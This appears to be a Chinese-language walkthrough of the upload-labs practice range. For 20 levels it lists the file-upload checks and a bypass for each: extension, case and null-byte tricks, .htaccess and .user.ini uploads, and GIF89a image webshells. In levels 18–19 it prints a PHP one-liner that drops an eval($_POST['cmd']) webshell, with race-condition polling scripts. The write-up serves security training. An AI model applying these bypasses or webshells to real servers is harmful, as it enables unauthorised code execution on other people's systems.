---
title: upload-labs
category: Labs
date: 2024-3-11
---



靶场地址：[点击下载](https://github.com/c0ny1/upload-labs)

## Less-1

```php
检测方式：
前端javascript检测

-> 禁用前端javascript检测代码
```

## Less-2

```php
检测方式：
后端检测
检测MIME类型

-> 修改为Content-Type: image/jpeg
```

## Less-3

```php
检测方式：
后端检测
黑名单检测
首尾去空
去掉后缀结尾的.
一律转换为小写
置空:$DATA 

-> 修改为其他可解析的后缀 -> .php3 .php5 .phpt .phtml
```

## Less-4

```php
检测方式：
后端检测 
黑名单检测 
一律转换为小写
首尾去空
去掉后缀结尾的.
置空:$DATA 
禁用了其他可解析的后缀 .php3 .php5 .phpt .phtml

-> 上传.htaccess
```

## Less-5

```php
检测方式：
后端检测 
黑名单检测 
一律转换为小写
首尾去空
置空:$DATA 
去掉后缀结尾的.
禁用了其他可解析的后缀 .php3 .php5 .phpt .phtml 
禁用了.htaccess 

-> 上传.user.ini 访问readme.php
```

## Less-6

```php
检测方式：
后端检测 
黑名单检测 
置空:$DATA 
首尾去空
去掉后缀结尾的.
禁用了其他可解析的后缀 .php3 .php5 .phpt .phtml 
禁用了.htaccess
禁用.ini

-> 大小写绕过 -> .PHp
```

## Less-7

```php
检测方式：
后端检测 
黑名单检测 
置空:$DATA 
一律转换为小写
去掉后缀结尾的.
禁用了其他可解析的后缀 .php3 .php5 .phpt .phtml 
禁用了.htaccess
禁用.ini

-> 后缀加空格 -> .php //空格
```

## Less-8

```php
检测方式：
后端检测 
黑名单检测 
置空:$DATA 
一律转换为小写
首尾去空
禁用了其他可解析的后缀 .php3 .php5 .phpt .phtml 
禁用了.htaccess
禁用.ini

-> 后缀加. -> .php.
```

## Less-9

```php
检测方式：
后端检测 
黑名单检测 
一律转换为小写
首尾去空
禁用了其他可解析的后缀 .php3 .php5 .phpt .phtml 
去掉后缀结尾的.
禁用了.htaccess
禁用.ini

-> 后缀加::$DATA -> .php::$DATA
```

## Less-10

```php
检测方式：
后端检测 
黑名单检测 
一律转换为小写
首尾去空
置空:$DATA 
禁用了其他可解析的后缀 .php3 .php5 .phpt .phtml 
去掉后缀结尾的.
禁用了.htaccess
禁用.ini

(deldot函数从后向前检测，当检测到末尾的第一个点时会继续它的检测，但是遇到空格会停下来)

-> 后缀加. . -> .php. .
```

## Less-11

```php
检测方式：
后端检测 
黑名单检测 
把.php3 .php5 .phpt .phtml .htaccess .ini置空

(str_ireplace(find,replace,string,count) 函数替换字符串中的一些字符)

-> 双写后缀 -> .pphphp
```

## Less-12

```php
检测方式：
后端检测 
白名单检测 

(php版本<5.3.4，并且magic_quotes_gpc关闭)

-> %00 截断
```

## Less-13

```php
检测方式：
后端检测 
白名单检测 

-> 0x00 截断
```

## Less-14

```php
检测方式：
后端检测 
判断文件前两个字节,根据判断得到的类型重命名

-> 在一句话木马前加 GIF89a 结合文件包含漏洞包含此"图片"
```

## Less-15

```php
检测方式：
后端检测 
getimagesize()检查是否为图片文件

-> 在一句话木马前加 GIF89a 结合文件包含漏洞包含此"图片"
```

## Less-16

```php
检测方式：
后端检测 
exif_imagetype()读取一个图像的第一个字节并检查其后缀名

-> 在一句话木马前加 GIF89a 结合文件包含漏洞包含此"图片"
```

## Less-17

```php
检测方式：
后端检测 
二次渲染

-> 先上传正常的gif，把上传的gif下载下来，与原始gif对比hex，在不变的地方，插入一句话
```

## Less-18

```python
检测方式：
后端检测 
服务器先是将上传的文件保存下来，然后将文件的后缀名同白名单对比，如果是jpg、png、gif中的一种，就将文件进行重命名。如果不符合的话，unlink()函数就会删除该文件

(条件竞争)
-> intruder不断上传php文件，用python脚本不断访问目标文件
(总会有那么一瞬间是还没来得及删除就可以被访问到的，一旦访问到该文件就会在当前目录下生成一个xxx.php的一句话)

一句话
<?php fputs(fopen('xxx.php','w'),'<?php @eval($_POST["cmd"])?>');?>

脚本
import requests
url = "http://xxxx/upload-labs/upload/xxx.php"
while True:
    html = requests.get(url)
    if html.status_code == 200:
        print("OK")
        break
```

## Less-19

```python
检测方式：
后端检测
服务器先是将文件后缀跟白名单做了对比，然后检查了文件大小以及文件是否已经存在。文件上传之后又对其进行了重命名。

(条件竞争)
-> intruder不断上图片马，用python脚本不断访问包含该文件
(总会有那么一瞬间是还没来得及删除就可以被访问到的，一旦包含该文件就会在当前目录下生成一个xxx.php的一句话)

一句话
<?php fputs(fopen('xxx.php','w'),'<?php @eval($_POST["cmd"])?>');?>

import requests
url = "http://127.0.0.1/upload-labs/include.php?file=upload/test.png"
while True:
    html = requests.get(url)
    if ( 'Warning'  not in  str(html.text)):
        print('ok')
        break
```

## Less-20

```php
检测方式：
后端检测
只对用户输入的文件名做判断
黑名单检测

(上传的文件名用户可控)
(move_uploaded_file()还有这么一个特性，会忽略掉文件末尾的 /.)

-> 以jpg为后缀上传，再保存为.php/.,既绕过了黑名单后缀，又使得可以解析php代码
```
